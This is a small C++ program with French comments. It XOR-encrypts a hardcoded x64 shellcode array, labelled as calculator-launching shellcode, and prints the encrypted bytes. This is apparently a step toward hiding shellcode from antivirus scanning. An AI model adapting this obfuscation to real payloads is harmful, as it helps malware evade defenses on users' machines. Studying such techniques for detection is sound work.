#include <iostream>
#include <string>

void xor_encrypt(unsigned char* data, std::size_t size, const std::string& key) {
    std::size_t key_size = key.size();
    for (std::size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_size];
    }
}

int main() {
    // shellcode de la calculatrice

    unsigned char calculator[] =
        "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x74\xf4\x0e\xa4\x3a\xac\x3f\x02\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x88\xbc\x8d"
        "\x40\xca\x44\xff\x02\x74\xf4\x4f\xf5\x7b\xfc\x6d\x53\x22"
        "\xbc\x3f\x76\x5f\xe4\xb4\x50\x14\xbc\x85\xf6\x22\xe4\xb4"
        "\x50\x54\xbc\x85\xd6\x6a\xe4\x30\xb5\x3e\xbe\x43\x95\xf3"
        "\xe4\x0e\xc2\xd8\xc8\x6f\xd8\x38\x80\x1f\x43\xb5\x3d\x03"
        "\xe5\x3b\x6d\xdd\xef\x26\xb5\x5f\xec\xb1\xfe\x1f\x89\x36"
        "\xc8\x46\xa5\xea\x27\xbf\x8a\x74\xf4\x0e\xec\xbf\x6c\x4b"
        "\x65\x3c\xf5\xde\xf4\xb1\xe4\x27\x46\xff\xb4\x2e\xed\x3b"
        "\x7c\xdc\x54\x3c\x0b\xc7\xe5\xb1\x98\xb7\x4a\x75\x22\x43"
        "\x95\xf3\xe4\x0e\xc2\xd8\xb5\xcf\x6d\x37\xed\x3e\xc3\x4c"
        "\x14\x7b\x55\x76\xaf\x73\x26\x7c\xb1\x37\x75\x4f\x74\x67"
        "\x46\xff\xb4\x2a\xed\x3b\x7c\x59\x43\xff\xf8\x46\xe0\xb1"
        "\xec\x23\x4b\x75\x24\x4f\x2f\x3e\x24\x77\x03\xa4\xb5\x56"
        "\xe5\x62\xf2\x66\x58\x35\xac\x4f\xfd\x7b\xf6\x77\x81\x98"
        "\xd4\x4f\xf6\xc5\x4c\x67\x43\x2d\xae\x46\x2f\x28\x45\x68"
        "\xfd\x8b\x0b\x53\xec\x80\xad\x3f\x02\x74\xf4\x0e\xa4\x3a"
        "\xe4\xb2\x8f\x75\xf5\x0e\xa4\x7b\x16\x0e\x89\x1b\x73\xf1"
        "\x71\x81\x5c\x8a\xa0\x22\xb5\xb4\x02\xaf\x11\xa2\xfd\xa1"
        "\xbc\x8d\x60\x12\x90\x39\x7e\x7e\x74\xf5\x44\x4f\xa9\x84"
        "\x45\x67\x86\x61\xce\x3a\xf5\x7e\x8b\xae\x0b\xdb\xc7\x5b"
        "\xc0\x5c\x2c\x11\x8c\x6b\xa4\x3a\xac\x3f\x02";

    std::size_t calculator_size = sizeof(calculator) - 1;  // -1 pour ignorer le caractère de fin de chaîne
    std::string key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+|}{:?><,./;'[]\\=-`~ ";

    // Chiffrer le shellcode
    xor_encrypt(calculator, calculator_size, key);

    // Afficher le shellcode chiffré
    std::cout << "Shellcode chiffre: ";
    for (std::size_t i = 0; i < calculator_size; i++) {
        std::cout << "\\x" << std::hex << static_cast<int>(calculator[i]);
    }
    std::cout << std::endl;

    return 0;
}